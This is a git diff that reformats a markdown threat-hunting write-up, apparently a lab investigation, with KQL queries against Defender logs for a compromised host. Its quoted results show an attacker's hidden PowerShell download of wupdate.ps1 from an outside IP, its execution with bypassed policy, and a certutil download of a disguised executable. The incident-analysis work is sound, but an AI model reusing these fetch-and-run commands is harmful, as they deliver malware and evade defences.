@@ -199,7 +199,8 @@ DeviceNetworkEvents
 
 <img width="1140" height="500" alt="image" src="https://github.com/user-attachments/assets/51ad81a0-fe57-4eb3-974c-c07d47cf1dfa" />
 
-**Query 3 - Internal Reconnaissance:
+
+**Query 3 - Internal Reconnaissance:**
 ```sql
 DeviceProcessEvents
 | where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
@@ -209,9 +210,12 @@ DeviceProcessEvents
 | project Timestamp, AccountName, DeviceName, FileName, ProcessCommandLine
 | order by Timestamp desc
 ```
-Results:
+**Results:**
+
 <img width="1157" height="665" alt="image" src="https://github.com/user-attachments/assets/271eb6be-ec21-4022-b306-4da20cb26f1b" />
+
 **Query 4 - Malicious PowerShell Execution:**
+
 ```sql
 DeviceFileEvents
 | where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
@@ -220,12 +224,15 @@ DeviceFileEvents
 | order by Timestamp asc 
 ```
 **Results:**
+
 ```sql
 powershell  -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://78.141.196.6:8080/wupdate.ps1' -OutFile 'C:\Users\KENJI~1.SAT\AppData\Local\Temp\wupdate.ps1' -UseBasicParsing"
 ```
+
 <img width="1080" height="632" alt="image" src="https://github.com/user-attachments/assets/9bb5514a-f9ee-40e5-9aa7-51eb12bb34d8" />
 
 **Query 5 - Staging Directory Created**
+
 ```sql
 DeviceFileEvents
 | where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) 
@@ -236,25 +243,31 @@ DeviceFileEvents
 | project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessVersionInfoOriginalFileName
 | order by Timestamp desc 
 ```
+
 **Results:**
+
 ```sql
 "powershell.exe" -ExecutionPolicy Bypass -File C:\Users\kenji.sato\AppData\Local\Temp\wupdate.ps1
 ```
 <img width="1183" height="672" alt="image" src="https://github.com/user-attachments/assets/d1e5f78c-31d5-47b3-bf30-c12d0328ae90" />
 
 **Query 6 - Malware Downloaded via CertUtil (Defense Evasion):**
+
 ```sql
 DeviceProcessEvents
 | where DeviceName == "azuki-sl"
 | where ProcessCommandLine has_any ("msedge", "Atbroker", "AppInstaller", "Certutil")
 ```
+
 **Results:**
+
 ```sql
  “"certutil.exe" -urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe”
 ```
 <img width="1209" height="531" alt="image" src="https://github.com/user-attachments/assets/a5feae11-c7ea-4680-aac3-0adf0e7a327b" />
 
 **Query 7 - Persistence Established:**
+
 ```sql
 DeviceProcessEvents
 | where DeviceName == "azuki-sl"
